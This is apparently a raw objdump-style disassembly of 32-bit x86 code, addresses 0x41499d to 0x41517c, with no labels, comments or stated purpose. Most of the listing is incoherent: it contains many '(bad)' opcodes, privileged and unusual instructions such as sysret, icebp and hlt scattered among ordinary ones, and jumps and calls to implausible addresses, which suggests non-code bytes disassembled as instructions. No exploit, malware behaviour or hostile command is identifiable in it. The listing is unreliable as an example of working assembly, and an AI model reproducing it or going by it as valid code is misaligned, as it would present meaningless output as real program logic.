  41499d:	mov    edx,DWORD PTR [eax]
  41499f:	cld    
  4149a0:	dec    ebp
  4149a1:	push   ebp
  4149a2:	sub    edx,DWORD PTR [ecx-0x75]
  4149a5:	add    eax,0xf172fc
  4149aa:	or     BYTE PTR [ebp+0x7],cl
  4149ad:	add    eax,ecx
  4149af:	or     al,0x72
  4149b1:	add    DWORD PTR [eax],eax
  4149b3:	mov    ebx,0x29c2c1
  4149b8:	inc    ebp
  4149b9:	mov    eax,DWORD PTR [ebx]
  4149bb:	cmp    eax,0x3004d1c
  4149c1:	xbegin 0x66c6d5bb
  4149c7:	clc    
  4149c8:	or     BYTE PTR [ebp+0x45],al
  4149cb:	xor    BYTE PTR ds:0x78b089c,dh
  4149d1:	adc    BYTE PTR [ebp+0x45],cl
  4149d4:	lea    eax,[ebp+0x33727501]
  4149da:	add    cl,ch
  4149dc:	inc    ebp
  4149dd:	add    bl,ch
  4149df:	add    BYTE PTR [ebx+0x45850845],cl
  4149e5:	je     0x414972
  4149e7:	push   ebx
  4149e8:	or     al,0x85
  4149ea:	dec    ebp
  4149eb:	std    
  4149ec:	mov    bh,bh
  4149ee:	mov    BYTE PTR [ebp-0x75],al
  4149f1:	mov    edi,eax
  4149f3:	or     al,0x89
  4149f5:	inc    ebp
  4149f6:	clc    
  4149f7:	mov    esp,esp
  4149f9:	hlt    
  4149fa:	call   DWORD PTR [edi-0x37]
  4149fd:	push   ebp
  4149fe:	or     al,0x51
  414a00:	push   ebp
  414a01:	xor    ebp,esp
  414a03:	mov    esi,0x457251
  414a08:	xor    esi,eax
  414a0a:	pushf  
  414a0b:	inc    ebp
  414a0c:	(bad)  
  414a0d:	mov    edi,eax
  414a0f:	or     al,0x85
  414a11:	add    al,bh
  414a13:	inc    eax
  414a15:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  414a19:	or     ah,bh
  414a1b:	inc    eax
  414a1c:	push   ebp
  414a1d:	jmp    0x414a70
  414a1f:	mov    eax,DWORD PTR ds:0xe8720c
  414a25:	mov    DWORD PTR [ebp-0x8],eax
  414a28:	jne    0x414a6f
  414a2a:	jmp    0x4149b7
  414a2c:	mov    ebp,DWORD PTR [eax]
  414a2e:	clc    
  414a2f:	retf   0xff55
  414a32:	push   ecx
  414a33:	mov    DWORD PTR ds:0x757210,eax
  414a39:	mov    ecx,DWORD PTR [ebp-0x4]
  414a3c:	sub    esp,DWORD PTR [ebx-0x77]
  414a3f:	dec    DWORD PTR [eax*4-0x74ca8abb]
  414a46:	or     ah,bh
  414a48:	pop    es
  414a49:	ds pushf 
  414a4b:	push   DWORD PTR [edx]
  414a4d:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  414a53:	(bad)  
  414a54:	mov    bh,bh
  414a56:	jmp    0x414a44
  414a58:	leave  
  414a59:	jne    0x414a63
  414a5b:	call   0x2e43b5
  414a60:	in     al,dx
  414a61:	dec    ebp
  414a62:	add    dh,BYTE PTR [ebx]
  414a64:	add    BYTE PTR [ebx],al
  414a66:	inc    ebp
  414a67:	cmp    esi,DWORD PTR [ecx]
  414a69:	je     0x414a07
  414a6b:	mov    eax,edi
  414a6d:	or     al,0xf0
  414a6f:	add    BYTE PTR [ebp+0x458bf845],al
  414a75:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  414a7b:	adc    al,0x7
  414a7d:	enter  0x9fc0,0xa5
  414a81:	rol    BYTE PTR [eax],0x5e
  414a84:	mov    ecx,ecx
  414a86:	or     al,0xc
  414a88:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  414a8f:	jmp    0x414a90
  414a91:	push   ebp
  414a92:	mov    esp,ebp
  414a94:	cld    
  414a95:	inc    ebp
  414a96:	inc    ebp
  414a97:	or     DWORD PTR [ecx+0x457dec10],0x0
  414a9e:	push   esi
  414a9f:	push   esi
  414aa0:	mov    edi,0x7af080f
  414aa5:	add    bh,al
  414aa7:	test   DWORD PTR [edi+ecx*1+0x3a732],ebx
  414aae:	mov    DWORD PTR [edi],ecx
  414ab0:	adc    BYTE PTR [eax+0x45],al
  414ab3:	mov    ebp,eax
  414ab5:	mov    ebp,edi
  414ab7:	lock call edx
  414aba:	fcom   DWORD PTR [ebp+0x45]
  414abd:	mov    eax,0x148a8b
  414ac2:	push   ecx
  414ac3:	enter  0xc145,0x83
  414ac7:	cmp    ecx,DWORD PTR [eax]
  414ac9:	add    BYTE PTR [ebp+0x4d],al
  414acc:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  414ad2:	call   0xffa14641
  414ad7:	cmp    eax,DWORD PTR [ebp-0xc]
  414ada:	jmp    DWORD PTR [eax+edx*1-0x4e]
  414ade:	push   ebp
  414adf:	(bad)  
  414ae0:	call   0x3248e4
  414ae5:	mov    bh,0xdb
  414ae7:	cld    
  414ae8:	or     BYTE PTR [ebp+0x45],bl
  414aeb:	(bad)  
  414aec:	call   0xff7b477c
  414af1:	add    al,BYTE PTR [ebp+0x37]
  414af4:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  414afa:	jne    0x414afc
  414afc:	(bad)  
  414afd:	cmp    edi,esp
  414aff:	jne    0x414b32
  414b01:	mov    edi,edi
  414b03:	or     BYTE PTR [ebx-0x307f0b49],cl
  414b09:	pop    ds
  414b0a:	into   
  414b0b:	je     0x414ace
  414b0d:	mov    ebx,DWORD PTR [esi]
  414b0f:	or     BYTE PTR [ebp-0x49],al
  414b12:	mov    esp,DWORD PTR [esi-0x77]
  414b15:	mov    esi,0x4451f0c
  414b1a:	mov    eax,DWORD PTR [eax]
  414b1c:	or     al,0x66
  414b1e:	sar    bl,0x3b
  414b21:	xor    esi,DWORD PTR [ebp+0x66]
  414b24:	xor    ecx,edi
  414b26:	pop    edi
  414b27:	adc    bl,BYTE PTR [ebx+0x70]
  414b2a:	ret    0xff
  414b2d:	cld    
  414b2e:	inc    ebp
  414b2f:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  414b35:	cld    
  414b36:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  414b3d:	push   0xffffff83
  414b3f:	pop    edi
  414b40:	or     BYTE PTR [ebp+0x53],dh
  414b43:	xorps  xmm1,xmm2
  414b46:	test   BYTE PTR [eax+eax*1],bh
  414b49:	add    BYTE PTR [eax],al
  414b4b:	adc    eax,eax
  414b4d:	add    DWORD PTR [eax+esi*2-0xff7b00],0xffffffb7
  414b55:	jmp    DWORD PTR [eax]
  414b57:	ror    al,0x5e
  414b5a:	inc    ebp
  414b5b:	leave  
  414b5c:	xor    ecx,DWORD PTR [eax]
  414b5e:	and    DWORD PTR [ebx-0x3ec10708],ecx
  414b64:	add    ah,al
  414b66:	xor    edi,edi
  414b68:	xor    DWORD PTR [ebx],0x66003304
  414b6e:	mov    DWORD PTR [ebp-0xc],ecx
  414b71:	pcmpgtw mm0,mm0
  414b74:	add    dl,ah
  414b76:	leave  
  414b77:	mov    edi,DWORD PTR [esi-0x7d]
  414b7a:	push   ax
  414b7c:	dec    ebp
  414b7d:	mov    esi,DWORD PTR [ebx-0x75]
  414b80:	lea    ebp,[eax-0x7c00ff04]
  414b86:	xor    eax,DWORD PTR [eax]
  414b88:	sysret 
  414b8a:	dec    ebp
  414b8b:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  414b92:	push   WORD PTR [ecx+0x8]
  414b96:	jne    0x414b59
  414b98:	ud0    ecx,DWORD PTR [ecx]
  414b9b:	mov    eax,edx
  414b9d:	lods   al,BYTE PTR ds:[esi]
  414b9e:	add    BYTE PTR [eax],al
  414ba0:	data16 (bad) 
  414ba2:	iret   
  414ba3:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  414baa:	cli    
  414bab:	inc    ebp
  414bac:	cmp    al,0x8d
  414bae:	add    BYTE PTR [esi+0x2d],ah
  414bb1:	inc    ebp
  414bb2:	pop    ebp
  414bb3:	lea    ecx,[edi]
  414bb5:	mov    dl,bh
  414bb7:	add    BYTE PTR [edi],cl
  414bb9:	mov    DWORD PTR [eax+eax*8],edi
  414bbc:	mov    ebx,0x3b87
  414bc1:	add    BYTE PTR [ebx],ch
  414bc3:	inc    ebp
  414bc4:	data16 (bad) 
  414bc6:	clc    
  414bc7:	int3   
  414bc8:	cmp    eax,DWORD PTR [eax]
  414bca:	je     0x414b55
  414bcc:	push   0xffffffc8
  414bce:	pop    edi
  414bcf:	xchg   DWORD PTR [ebp+0x0],eax
  414bd2:	data16 add BYTE PTR [ebp+0x45],cl
  414bd6:	lea    cx,[ebp+0x10]
  414bda:	jb     0x414bdc
  414bdc:	jmp    0x414b67
  414bde:	call   eax
  414be0:	clc    
  414be1:	xchg   DWORD PTR [edi+0x1],edi
  414be4:	mov    eax,DWORD PTR [eax]
  414be6:	or     BYTE PTR [ebp-0x49],al
  414be9:	lea    eax,[eax+0x74003154]
  414bef:	push   edi
  414bf0:	inc    edx
  414bf1:	jge    0x414bf2
  414bf3:	mov    DWORD PTR [edi],ecx
  414bf5:	fdiv   DWORD PTR [edi-0x6]
  414bf8:	inc    DWORD PTR [eax]
  414bfa:	xor    edx,DWORD PTR [eax+0x5f]
  414bfd:	xchg   DWORD PTR [ebx+0x1],ebx
  414c00:	ret    0x0
  414c03:	xor    BYTE PTR [ebp-0x51],cl
  414c06:	cmp    edi,0xf0ff89fc
  414c0c:	data16 ror al,0x84
  414c10:	rol    BYTE PTR [eax],0x3b
  414c13:	add    al,dh
  414c15:	dec    eax
  414c16:	xchg   esp,eax
  414c17:	push   ebx
  414c18:	jmp    0x414ba5
  414c1a:	push   ebp
  414c1b:	add    esp,ebp
  414c1d:	add    ebp,esp
  414c1f:	mov    edx,DWORD PTR [edi+0x24]
  414c22:	clc    
  414c23:	dec    esi
  414c24:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  414c2a:	cmp    BYTE PTR [ebx],al
  414c2c:	jne    0x414bb7
  414c2e:	xor    esp,eax
  414c30:	jmp    0x444db3
  414c35:	add    ebp,DWORD PTR [ecx+ecx*4]
  414c38:	jne    0x414c2e
  414c3a:	call   0xffcb4994
  414c3f:	clc    
  414c40:	xchg   edi,eax
  414c41:	sti    
  414c42:	add    DWORD PTR [ebx],eax
  414c44:	add    BYTE PTR [ebp+0x47],bl
  414c47:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  414c4d:	pop    ebp
  414c4e:	mov    DWORD PTR [esi-0x48],esi
  414c51:	jmp    0x414c9a
  414c53:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  414c59:	(bad)  
  414c5b:	cmp    al,0x0
  414c5d:	cmp    eax,DWORD PTR [ebp+0x18]
  414c60:	lea    ebx,[ebp-0x56]
  414c63:	jle    0x414c65
  414c65:	jae    0x414bf0
  414c67:	mov    eax,esp
  414c69:	call   0xb900:0x8b005587
  414c70:	inc    ebp
  414c71:	push   ebp
  414c72:	lea    ecx,[ebp-0x27ff4f12]
  414c78:	mov    eax,edi
  414c7a:	int3   
  414c7b:	push   ebp
  414c7c:	xchg   edi,eax
  414c7e:	add    esp,ebp
  414c80:	add    BYTE PTR [eax],al
  414c82:	inc    ebp
  414c83:	add    BYTE PTR [ebp+0x8b3255],cl
  414c89:	cld    
  414c8a:	mov    DWORD PTR [edx],edi
  414c8c:	aam    0x75
  414c8e:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  414c94:	mov    DWORD PTR [ebx-0x50],edx
  414c97:	test   BYTE PTR [ebp-0x1],0xe8
  414c9b:	mov    eax,DWORD PTR [eax]
  414c9d:	hlt    
  414c9e:	add    al,al
  414ca0:	mov    eax,DWORD PTR ds:0x890045a8
  414ca6:	dec    DWORD PTR [ebx+0x45fdf0e8]
  414cac:	inc    DWORD PTR [eax*2+0xf75854d]
  414cb3:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  414cb9:	call   0x7297a9fa
  414cbe:	je     0x414d1e
  414cc0:	js     0x414d21
  414cc2:	lock ret 0x7e
  414cc6:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  414ccc:	mov    edi,edi
  414cce:	sbb    al,bl
  414cd0:	clc    
  414cd1:	add    BYTE PTR [ebp-0x73],bh
  414cd4:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  414cda:	ror    BYTE PTR [eax],1
  414cdc:	dec    ebp
  414cdd:	xchg   ebp,eax
  414cde:	mov    edi,edi
  414ce0:	in     al,0x8b
  414ce2:	jge    0x414c6d
  414ce4:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  414cea:	clc    
  414ceb:	pop    esi
  414cec:	fist   DWORD PTR [ebp+0x5d398b5d]
  414cf2:	clc    
  414cf3:	add    al,0x6e
  414cf5:	mov    eax,DWORD PTR [ebx]
  414cf7:	mov    BYTE PTR [ebp+0x0],dl
  414cfa:	mov    edx,DWORD PTR [ebx-0x20]
  414cfd:	adc    esi,DWORD PTR [edi+0x5e005f3e]
  414d03:	add    eax,0x3b3b73
  414d08:	adc    al,0x89
  414d0a:	pop    eax
  414d0b:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  414d0f:	ret    0xf08
  414d12:	cmp    al,0x2
  414d14:	mov    edx,eax
  414d16:	cld    
  414d17:	add    BYTE PTR [ebp+0x66],dl
  414d1a:	add    eax,ebx
  414d1c:	add    esp,eax
  414d1e:	sub    eax,eax
  414d20:	or     BYTE PTR [ecx-0x77f474bb],cl
  414d26:	add    BYTE PTR [eax],al
  414d28:	mov    DWORD PTR [ebx-0x24],ebx
  414d2b:	push   edi
  414d2c:	push   ebp
  414d2d:	clc    
  414d2e:	add    DWORD PTR [esi+0x1b0100],0x45
  414d35:	out    0xff,eax
  414d37:	add    edx,DWORD PTR [eax]
  414d39:	jmp    0x414d23
  414d3b:	cmp    ch,0x47
  414d3e:	(bad)  
  414d3f:	jmp    0x40c6d591
  414d44:	je     0x414cd0
  414d46:	mov    eax,DWORD PTR [eax-0x10c78f04]
  414d4c:	inc    ebp
  414d4d:	add    BYTE PTR [ebx-0x770375],al
  414d53:	add    ah,ch
  414d55:	add    edx,esp
  414d57:	pop    edi
  414d58:	pop    ebp
  414d59:	push   ebp
  414d5a:	inc    ebx
  414d5b:	in     al,dx
  414d5c:	pop    ebp
  414d5d:	in     al,dx
  414d5e:	cmp    edx,DWORD PTR [edi-0x8]
  414d61:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  414d68:	add    al,0x47
  414d6a:	push   ebp
  414d6b:	mov    esp,ebp
  414d6d:	in     al,0x45
  414d6f:	dec    ebp
  414d70:	push   esi
  414d71:	test   DWORD PTR [eax+0xfb010f],esi
  414d77:	add    BYTE PTR [eax+0xc018b],dh
  414d7d:	leave  
  414d7e:	inc    ebp
  414d7f:	test   al,ch
  414d81:	add    dh,bh
  414d83:	add    bh,bh
  414d85:	dec    ebp
  414d86:	push   cs
  414d87:	mov    DWORD PTR [ecx],eax
  414d89:	hlt    
  414d8a:	push   es
  414d8b:	dec    ebp
  414d8c:	leave  
  414d8d:	mov    DWORD PTR [eax],ecx
  414d8f:	clc    
  414d90:	cmovge eax,ecx
  414d93:	mov    ecx,0x85c2f0
  414d99:	clc    
  414d9a:	pop    DWORD PTR [ebp+0x1]
  414d9d:	push   ebx
  414d9e:	add    BYTE PTR [ebp-0x15],bh
  414da1:	push   esi
  414da2:	xor    eax,0x898a45
  414da7:	cld    
  414da8:	add    al,0x45
  414daa:	add    BYTE PTR [ebx],dh
  414dac:	pushfw 
  414dae:	add    DWORD PTR [esi+0x78308c1],edi
  414db4:	add    ah,BYTE PTR [edi+esi*4-0x33]
  414db8:	mov    ebx,0xc4e8b
  414dbd:	(bad)  
  414dbe:	cmp    ecx,ebx
  414dc0:	jne    0x414d8a
  414dc2:	xor    ecx,DWORD PTR [ebp+0x66]
  414dc5:	jmp    0xc84dcb
  414dca:	add    DWORD PTR [ebp+0x0],eax
  414dcd:	mov    eax,ebx
  414dcf:	or     al,0x8b
  414dd1:	(bad)  
  414dd2:	mov    ecx,esi
  414dd4:	mov    BYTE PTR [eax+eax*1+0x664c138],cl
  414ddb:	mov    eax,edi
  414ddd:	or     BYTE PTR [edx],cl
  414ddf:	shl    cl,cl
  414de1:	icebp  
  414de2:	add    BYTE PTR [ebp+0x37],0x8b
  414de6:	or     BYTE PTR [edx+eax*2],cl
  414de9:	(bad)  
  414dea:	or     cl,dh
  414dec:	stc    
  414ded:	shl    DWORD PTR [ebp-0x30],0xc6
  414df1:	xor    al,0x0
  414df3:	inc    ebp
  414df4:	xchg   BYTE PTR [ebx],al
  414df6:	add    esp,edi
  414df8:	add    BYTE PTR [ebp-0x39],cl
  414dfb:	mov    al,bl
  414dfd:	test   DWORD PTR [ebx+0x1c348375],ecx
  414e03:	sub    al,0xbf
  414e05:	jmp    0x414d8c
  414e07:	mov    edi,eax
  414e09:	lock jge 0x414dfd
  414e0c:	lea    esi,[edx-0x74bad501]
  414e12:	mov    ebp,esp
  414e14:	or     cl,dh
  414e16:	leave  
  414e17:	add    al,BYTE PTR [eax+eax*4-0x37ff9c00]
  414e1e:	dec    ebp
  414e1f:	dec    ebp
  414e20:	test   DWORD PTR [ebx],eax
  414e22:	paddb  mm6,mm0
  414e25:	add    DWORD PTR [eax],eax
  414e27:	dec    ebp
  414e28:	mov    ecx,DWORD PTR [ebx-0x63b217f0]
  414e2e:	mov    esi,DWORD PTR [edx]
  414e30:	or     al,0x2b
  414e32:	dec    ebp
  414e33:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  414e39:	mov    esp,esi
  414e3b:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  414e42:	mov    DWORD PTR [ebx],ebp
  414e44:	call   0xc74d774
  414e49:	mov    DWORD PTR [ebp+0x10],ecx
  414e4c:	(bad)  
  414e4d:	push   0x8b85ff10
  414e52:	clc    
  414e53:	or     al,0x55
  414e55:	(bad)  
  414e56:	push   ecx
  414e57:	retf   
  414e58:	mov    ebx,0xff4d8dc8
  414e5d:	mov    DWORD PTR [ebp+0x8],eax
  414e60:	xor    eax,DWORD PTR [ebp-0x75]
  414e63:	cmp    ebp,DWORD PTR [ebx]
  414e65:	lsl    ebx,WORD PTR [edi-0x8]
  414e69:	call   DWORD PTR [ebx-0x741bff75]
  414e6f:	(bad)  
  414e70:	or     al,0x5b
  414e72:	dec    ebp
  414e73:	or     BYTE PTR [ebx],dh
  414e75:	inc    ebp
  414e76:	xor    esi,DWORD PTR ds:0x708088d
  414e7c:	in     eax,0x9c
  414e7e:	add    BYTE PTR [edx],dh
  414e80:	inc    ebp
  414e81:	pop    edi
  414e82:	xor    eax,edx
  414e84:	test   DWORD PTR [eax],0x83108b8b
  414e8a:	dec    ebp
  414e8b:	adc    al,0x33
  414e8d:	inc    ebp
  414e8e:	xor    esi,DWORD PTR [ecx]
  414e90:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  414e97:	test   DWORD PTR [eax],ecx
  414e99:	clc    
  414e9a:	inc    ebp
  414e9b:	add    ecx,DWORD PTR [ebx+0xc7f445]
  414ea1:	hlt    
  414ea2:	leave  
  414ea3:	test   DWORD PTR [esi],eax
  414ea5:	clc    
  414ea6:	inc    edi
  414ea7:	push   edi
  414ea8:	aaa    
  414ea9:	inc    ebp
  414eaa:	pop    ss
  414eab:	ror    DWORD PTR [ebp-0x29],1
  414eae:	or     BYTE PTR [ebx+0x4d64fc55],0xd1
  414eb5:	mov    eax,0x780084d
  414eba:	push   ebp
  414ebb:	clc    
  414ebc:	ret    0xe99c
  414ebf:	xor    dl,dl
  414ec1:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  414ec7:	js     0x887dac6
  414ecd:	dec    ebp
  414ece:	push   ebp
  414ecf:	mov    edi,DWORD PTR [eax+0xc872fc]
  414ed5:	lock enter 0xceca,0xf2
  414eda:	retf   0x18ce
  414edd:	jne    0x414f2c
  414edf:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  414ee5:	enter  0xf0d6,0xca
  414ee9:	retf   0xf2c8
  414eec:	into   
  414eed:	out    dx,al
  414eee:	dec    ebp
  414eef:	dec    ebp
  414ef0:	jmp    0xff454e28
  414ef5:	xor    eax,DWORD PTR [ebp-0x15]
  414ef8:	xor    esi,DWORD PTR [ebx]
  414efa:	mov    esi,DWORD PTR [ebx]
  414efc:	sub    eax,DWORD PTR [ebx]
  414efe:	add    eax,DWORD PTR [ebx]
  414f00:	or     bl,dl
  414f02:	dec    ebp
  414f03:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  414f09:	xor    eax,DWORD PTR [ebp-0xf00073]
  414f0f:	jb     0x414f56
  414f11:	add    BYTE PTR [ebx],dh
  414f13:	dec    ebp
  414f14:	pop    esi
  414f15:	mov    ebp,ebx
  414f17:	cld    
  414f18:	mov    esi,eax
  414f1a:	call   0x520fa4e7
  414f1f:	stc    
  414f20:	add    eax,0x4572aa
  414f25:	pop    edi
  414f26:	leave  
  414f27:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  414f2e:	in     al,dx
  414f2f:	mov    eax,edi
  414f31:	xor    eax,0xf8008520
  414f37:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  414f3e:	mov    eax,DWORD PTR [ebp-0x77]
  414f41:	xor    al,bh
  414f43:	pushf  
  414f44:	inc    ebp
  414f45:	(bad)  
  414f46:	cmp    eax,ebp
  414f48:	pushf  
  414f49:	xchg   BYTE PTR [esi-0x8],dl
  414f4c:	mov    edi,0x8518e4ec
  414f52:	jmp    0xf056:0x8b457df8
  414f59:	push   ebp
  414f5a:	push   ebp
  414f5b:	push   ecx
  414f5c:	push   ecx
  414f5d:	push   edi
  414f5e:	xor    eax,esi
  414f60:	mov    edx,0x32729c
  414f65:	add    ecx,eax
  414f67:	mov    edx,edi
  414f69:	clc    
  414f6a:	retf   0xaf45
  414f6d:	cmp    ebx,ebp
  414f6f:	pushf  
  414f70:	mov    eax,edi
  414f72:	clc    
  414f73:	cld    
  414f74:	jne    0x414f8e
  414f76:	xor    ebp,edx
  414f78:	xor    eax,DWORD PTR [ebp+0x3]
  414f7b:	or     BYTE PTR [ebx],al
  414f7d:	add    BYTE PTR [ebp-0x7747475],al
  414f83:	hlt    
  414f84:	dec    ebp
  414f85:	dec    ebp
  414f86:	je     0x414fbb
  414f88:	xor    esi,DWORD PTR [ebx]
  414f8a:	xor    eax,DWORD PTR [ebx]
  414f8c:	add    eax,DWORD PTR [ebx]
  414f8e:	add    ecx,DWORD PTR [edi]
  414f90:	rol    ecx,cl
  414f92:	mov    esi,DWORD PTR [ecx]
  414f94:	in     al,dx
  414f95:	inc    ebp
  414f96:	enter  0xca2b,0x33
  414f9a:	icebp  
  414f9b:	mov    DWORD PTR [edx],ecx
  414f9d:	clc    
  414f9e:	lock pop ebp
  414fa0:	enter  0xf2e8,0xfe
  414fa4:	retf   0xeeff
  414fa7:	inc    ebp
  414fa8:	jne    0x414f35
  414faa:	mov    edi,eax
  414fac:	cld    
  414fad:	dec    ebp
  414fae:	enter  0xbc89,0x8d
  414fb2:	pushf  
  414fb3:	sti    
  414fb4:	xor    bh,bh
  414fb6:	mov    eax,DWORD PTR [ebp-0xc]
  414fb9:	mov    esi,DWORD PTR [ebp-0x4]
  414fbc:	xor    eax,esi
  414fbe:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9c]
  414fc5:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  414fcb:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  414fd1:	(bad)  
  414fd2:	push   ebp
  414fd3:	shr    esp,0x4d
  414fd6:	in     al,dx
  414fd7:	cmp    eax,DWORD PTR [esi+esi*2]
  414fda:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  414fe0:	pushf  
  414fe1:	mov    edi,0x85c7f445
  414fe7:	call   0xf886d6e4
  414fec:	xor    ebx,ebx
  414fee:	pushf  
  414fef:	popa   
  414ff0:	push   ebx
  414ff1:	dec    ebp
  414ff2:	inc    ebp
  414ff3:	mov    esi,DWORD PTR [esi]
  414ff5:	clc    
  414ff6:	pushf  
  414ff7:	into   
  414ff8:	mov    ecx,edi
  414ffa:	in     al,dx
  414ffb:	call   0x8b4995be
  415000:	pop    es
  415001:	or     BYTE PTR [ebx],dh
  415003:	or     BYTE PTR [edi+0x8a724d],bh
  415009:	or     eax,edi
  41500b:	push   ebp
  41500c:	inc    ebp
  41500d:	cmpxchg8b (bad)
  41500e:	(bad)  
  41500f:	leave  
  415010:	loopne 0x414fdc
  415012:	test   DWORD PTR [ebp-0x8],ecx
  415015:	mov    eax,DWORD PTR [ebp-0x18]
  415018:	rcl    DWORD PTR [ebp-0x29],1
  41501b:	xor    eax,edi
  41501d:	add    esi,eax
  41501f:	and    eax,DWORD PTR [eax]
  415021:	mov    eax,DWORD PTR [eax]
  415023:	(bad)  
  415024:	leave  
  415025:	sti    
  415026:	inc    ebp
  415027:	dec    DWORD PTR [ebx-0x39cc13ab]
  41502d:	mov    esi,ecx
  41502f:	clc    
  415030:	(bad)  
  415031:	dec    ebp
  415032:	iret   
  415033:	xor    ebp,DWORD PTR [edi-0x74f71473]
  415039:	jb     0x415037
  41503b:	add    bh,al
  41503d:	inc    ebp
  41503e:	(bad)  
  41503f:	mov    eax,DWORD PTR [ebp-0xc]
  415042:	(bad)  
  415043:	xabort 0x64
  415046:	loopne 0x415015
  415048:	jmp    FWORD PTR [ebx]
  41504a:	mov    DWORD PTR [ebx],eax
  41504c:	clc    
  41504d:	lock inc ebp
  41504f:	dec    ebp
  415050:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  415056:	loopne 0x41508b
  415058:	inc    DWORD PTR [ebx]
  41505a:	mov    edi,DWORD PTR [ebx]
  41505c:	hlt    
  41505d:	jne    0x4150ac
  41505f:	mov    esi,DWORD PTR [ebx]
  415061:	in     al,0x8d
  415063:	dec    ebp
  415064:	or     BYTE PTR [ebx],dh
  415066:	jb     0x41506b
  415068:	add    BYTE PTR [edi+0x45],bl
  41506b:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  415071:	add    BYTE PTR [ebx],dh
  415073:	mov    esi,DWORD PTR [ebx]
  415075:	sub    DWORD PTR [ebx],0x6c
  415078:	mov    eax,DWORD PTR [ebp-0x4]
  41507b:	xor    eax,ecx
  41507d:	pushf  
  41507e:	mov    ecx,0x338545ba
  415083:	clc    
  415084:	add    edx,DWORD PTR [ebp-0x77]
  415087:	mov    edi,eax
  415089:	adc    al,0x45
  41508b:	inc    ebp
  41508c:	mov    ebx,DWORD PTR ss:[esp+edx*1+0x1eb808b]
  415094:	mov    eax,DWORD PTR [eax]
  415096:	loopne 0x4150e5
  415098:	inc    ebp
  415099:	mov    esi,DWORD PTR [ebx]
  41509b:	mov    eax,DWORD PTR [ebx]
  41509d:	nop
  41509e:	rol    DWORD PTR [eax],cl
  4150a0:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  4150a6:	mov    cl,BYTE PTR [ecx+0x450bf888]
  4150ac:	dec    ebp
  4150ad:	push   esi
  4150ae:	mov    edi,DWORD PTR [edi+0x7b608f8]
  4150b4:	xor    eax,edi
  4150b6:	mov    DWORD PTR [eax+ecx*1-0x74fcb2ce],ebx
  4150bd:	mov    DWORD PTR [eax],ecx
  4150bf:	in     al,dx
  4150c0:	into   
  4150c1:	inc    ebp
  4150c2:	iret   
  4150c3:	xor    ecx,edx
  4150c5:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  4150cc:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  4150d2:	dec    ebp
  4150d3:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  4150d9:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9c]
  4150e0:	mov    DWORD PTR [ecx+0x8],eax
  4150e3:	mov    eax,DWORD PTR [ebp-0x8]
  4150e6:	xor    ebx,DWORD PTR [eax]
  4150e8:	mov    ecx,0xff8b8d40
  4150ed:	clc    
  4150ee:	enter  0x4d49,0x48
  4150f2:	mov    eax,edx
  4150f4:	lock enter 0x4545,0x8b
  4150f9:	mov    esi,eax
  4150fb:	cmp    dh,al
  4150fd:	rol    edi,0x3
  415100:	enter  0x9140,0x89
  415104:	inc    ebp
  415105:	adc    al,0x8b
  415107:	inc    ebp
  415108:	clc    
  415109:	xor    eax,esi
  41510b:	add    eax,edi
  41510d:	mov    DWORD PTR [esi-0x24],ebx
  415110:	rol    DWORD PTR [ebp-0x37],0x33
  415114:	add    al,0x3
  415116:	push   ebp
  415117:	mov    esp,ebp
  415119:	fsubr  st,st(4)
  41511b:	inc    ebp
  41511c:	(bad)  
  41511d:	mov    edi,esp
  41511f:	adc    BYTE PTR [ebp+0x30c3f8c7],al
  415125:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  41512c:	inc    ebp
  41512d:	test   DWORD PTR [ecx+0x454514f8],ecx
  415133:	xor    cl,BYTE PTR [ebx+0xc7909c]
  415139:	fmul   DWORD PTR [ebx+0xf81485]
  41513f:	test   DWORD PTR [ecx+0x8b0100],ecx
  415145:	cld    
  415146:	or     edi,eax
  415148:	dec    eax
  415149:	ret    
  41514a:	push   ebx
  41514b:	inc    ebp
  41514c:	dec    ebp
  41514d:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  415153:	mov    DWORD PTR [ebp-0x14],edx
  415156:	push   ecx
  415157:	jne    0x41518c
  415159:	mov    edi,DWORD PTR [ebx+0x4d720c]
  41515f:	call   0xff874327
  415164:	mov    eax,DWORD PTR [ebp-0x4]
  415167:	mov    edi,0x4585c3d8
  41516d:	clc    
  41516e:	mov    eax,DWORD PTR [ebp-0x8]
  415171:	xor    eax,DWORD PTR [eax+0x3]
  415174:	adc    DWORD PTR [eax+0xc],0x45
  415178:	inc    ebp
  415179:	push   eax
  41517a:	mov    ebx,ebp
  41517c:	clc    
